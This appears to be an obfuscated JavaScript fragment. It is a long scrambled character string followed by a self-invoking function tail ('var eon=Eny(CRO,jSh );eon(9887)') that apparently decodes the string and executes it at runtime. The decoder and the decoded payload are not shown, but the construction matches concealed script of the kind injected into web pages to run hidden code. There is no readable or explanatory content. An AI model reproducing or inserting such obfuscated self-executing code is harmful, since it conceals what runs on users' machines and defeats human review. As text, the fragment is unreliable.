V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
